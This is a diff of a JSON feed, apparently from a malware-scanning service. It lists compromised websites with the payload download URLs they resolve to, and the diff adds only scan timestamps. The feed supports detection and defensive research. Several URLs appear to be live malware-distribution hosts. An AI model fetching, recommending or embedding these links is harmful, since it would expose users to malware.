-    "ReportId": "cmwbim3kk082e0nmlhg1n12e7"
+    "ReportId": "cmwbim3kk082e0nmlhg1n12e7",
+    "ScannedAt": "2026-11-11T02:43:56.710000+00:00"
   },
   {
     "UrlDomain": "vaikunthastays.com",
@@ -2157,7 +2262,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/a7c157619ac0c143"
     ],
-    "ReportId": "cmwbikra7080d0nmljddiidby"
+    "ReportId": "cmwbikra7080d0nmljddiidby",
+    "ScannedAt": "2026-11-11T02:42:54.146000+00:00"
   },
   {
     "UrlDomain": "holmesinspection.com",
@@ -2182,7 +2288,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/04f8fc1791e00fc8"
     ],
-    "ReportId": "cmwbij7ph07xp0nmlf5p7gu3z"
+    "ReportId": "cmwbij7ph07xp0nmlf5p7gu3z",
+    "ScannedAt": "2026-11-11T02:41:42.128000+00:00"
   },
   {
     "UrlDomain": "thefamhealth.com",
@@ -2201,7 +2308,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbiefis07tp0nmlgt4hh2x9"
+    "ReportId": "cmwbiefis07tp0nmlgt4hh2x9",
+    "ScannedAt": "2026-11-11T02:37:58.980000+00:00"
   },
   {
     "UrlDomain": "mehedi3937.infinityfreeapp.com",
@@ -2240,7 +2348,8 @@
       "https://script.google.com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec",
       "https://softify.lat/u/8ecec3ba"
     ],
-    "ReportId": "cmwbidflq07sb0nml927bheu2"
+    "ReportId": "cmwbidflq07sb0nml927bheu2",
+    "ScannedAt": "2026-11-11T02:37:12.276000+00:00"
   },
   {
     "UrlDomain": "faithofourfathersmission.org",
@@ -2259,7 +2368,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbi8kbf07op0nmlm3jwx96u"
+    "ReportId": "cmwbi8kbf07op0nmlm3jwx96u",
+    "ScannedAt": "2026-11-11T02:33:25.268000+00:00"
   },
   {
     "UrlDomain": "www.cleversources.com",
@@ -2275,7 +2385,8 @@
     "ResolvedDownloadUrl": [
       "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
     ],
-    "ReportId": "cmwbi0g9507kw0nmljk124v3m"
+    "ReportId": "cmwbi0g9507kw0nmljk124v3m",
+    "ScannedAt": "2026-11-11T02:27:06.700000+00:00"
   },
   {
     "UrlDomain": "nguyenvanhoafood.com",
@@ -2293,7 +2404,8 @@
     "ResolvedDownloadUrl": [
       "https://t-trustresnew.com/Girya/3a8b7746765169c8"
     ],
-    "ReportId": "cmwbh3b4i077j0nmlsxo3diav"
+    "ReportId": "cmwbh3b4i077j0nmlsxo3diav",
+    "ScannedAt": "2026-11-11T02:01:20.426000+00:00"
   },
   {
     "UrlDomain": "www.duomoregina.com",
@@ -2312,7 +2424,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589"
     ],
-    "ReportId": "cmwbh2fwd076j0nml0aa48cic"
+    "ReportId": "cmwbh2fwd076j0nml0aa48cic",
+    "ScannedAt": "2026-11-11T02:00:39.970000+00:00"
   },
   {
     "UrlDomain": "slow-work.eu",
@@ -2333,7 +2446,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/eda44de7cd33aa18"
     ],
-    "ReportId": "cmwbh1u7y075t0nmludx2sjsg"
+    "ReportId": "cmwbh1u7y075t0nmludx2sjsg",
+    "ScannedAt": "2026-11-11T02:00:11.861000+00:00"
   },
   {
     "UrlDomain": "rafaelalcala.com",
@@ -2352,7 +2466,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbgmb0b071b0nmliw209stc"
+    "ReportId": "cmwbgmb0b071b0nmliw209stc",
+    "ScannedAt": "2026-11-11T01:48:07.150000+00:00"
   },
   {
     "UrlDomain": "serengetifrontier.co.tz",
@@ -2368,7 +2483,8 @@
     "ResolvedDownloadUrl": [
       "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
     ],
-    "ReportId": "cmwbgl81k070e0nmliamdcqj4"
+    "ReportId": "cmwbgl81k070e0nmliamdcqj4",
+    "ScannedAt": "2026-11-11T01:47:16.660000+00:00"
   },
   {
     "UrlDomain": "www.istanbulsaatalanyerler.com",
@@ -2386,7 +2502,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwbg605706uo0nmla9szl8z1"
+    "ReportId": "cmwbg605706uo0nmla9szl8z1",
+    "ScannedAt": "2026-11-11T01:35:26.546000+00:00"
   },
   {
     "UrlDomain": "apcon.pk",
@@ -2405,7 +2522,8 @@
     "ResolvedDownloadUrl": [
       "https://gitlab.com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503"
     ],
-    "ReportId": "cmwbg59yh06tg0nml07fhq0z2"
+    "ReportId": "cmwbg59yh06tg0nml07fhq0z2",
+    "ScannedAt": "2026-11-11T01:34:52.586000+00:00"
   },
   {
     "UrlDomain": "iorea.ch",
@@ -2423,7 +2541,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwbg2vgl06s20nml1ro6c79z"
+    "ReportId": "cmwbg2vgl06s20nml1ro6c79z",
+    "ScannedAt": "2026-11-11T01:33:00.521000+00:00"
   },
   {
     "UrlDomain": "bilalindustries.com",
@@ -2441,7 +2560,8 @@
     "ResolvedDownloadUrl": [
       "https://frclau.com/eoN"
     ],
-    "ReportId": "cmwbg1jw206qq0nmlz0huek8f"
+    "ReportId": "cmwbg1jw206qq0nmlz0huek8f",
+    "ScannedAt": "2026-11-11T01:31:58.863000+00:00"
   },
   {
     "UrlDomain": "safeskill.co.za",
@@ -2470,7 +2590,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/d6635ac514ec3dc5"
     ],
-    "ReportId": "cmwbfkpep06i70nml6przoq86"
+    "ReportId": "cmwbfkpep06i70nml6przoq86",
+    "ScannedAt": "2026-11-11T01:18:52.837000+00:00"
   },
   {
     "UrlDomain": "cofeservice.ru",
@@ -2499,7 +2620,8 @@
       "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
       "https://script-six-tawny.vercel.app/lin"
     ],
-    "ReportId": "cmwbez2fg06ao0nmlov0j0g7o"
+    "ReportId": "cmwbez2fg06ao0nmlov0j0g7o",
+    "ScannedAt": "2026-11-11T01:02:03.343000+00:00"
   },
   {
     "UrlDomain": "thefoodsauciety.co.uk",
@@ -2524,7 +2646,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/c7b605b31ca2f950"
     ],
-    "ReportId": "cmwbetx19069t0nmlxbqcg989"
+    "ReportId": "cmwbetx19069t0nmlxbqcg989",
+    "ScannedAt": "2026-11-11T00:58:03.052000+00:00"
   },
   {
     "UrlDomain": "website-wizard.de",
@@ -2545,7 +2668,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/1e24abac1ebd5ed2"
     ],
-    "ReportId": "cmwbejue2065s0nmlscnp3a86"
+    "ReportId": "cmwbejue2065s0nmlscnp3a86",
+    "ScannedAt": "2026-11-11T00:50:13.046000+00:00"
   },
   {
     "UrlDomain": "personalgym.in",
@@ -2570,7 +2694,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/189b1694d7e41576"
     ],
-    "ReportId": "cmwbdvg6l060a0nmlbwktk2x9"
+    "ReportId": "cmwbdvg6l060a0nmlbwktk2x9",
+    "ScannedAt": "2026-11-11T00:31:14.887000+00:00"
   },
   {
     "UrlDomain": "flouz.agency",
@@ -2600,7 +2725,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/cd7f076054b8a4ce"
     ],
-    "ReportId": "cmwbdbmzm05o30nmlvn4xeoc2"
+    "ReportId": "cmwbdbmzm05o30nmlvn4xeoc2",
+    "ScannedAt": "2026-11-11T00:15:50.614000+00:00"
   },
   {
     "UrlDomain": "www.ilmelograno.app",
@@ -2625,7 +2751,8 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/3f8a349007b400af"
     ],
-    "ReportId": "cmwbd1grm05iz0nmlids065kj"
+    "ReportId": "cmwbd1grm05iz0nmlids065kj",
+    "ScannedAt": "2026-11-11T00:07:55.989000+00:00"
   },
   {
     "UrlDomain": "www.njrka.lt",
@@ -2655,6 +2782,7 @@
     "ResolvedDownloadUrl": [
       "https://browse-nnccodes.beer/44f5c1c159276caa"
     ],
-    "ReportId": "cmwbd0qn205i20nmle2htabf0"
+    "ReportId": "cmwbd0qn205i20nmle2htabf0",
+    "ScannedAt": "2026-11-11T00:07:22.150000+00:00"
   }
 ]
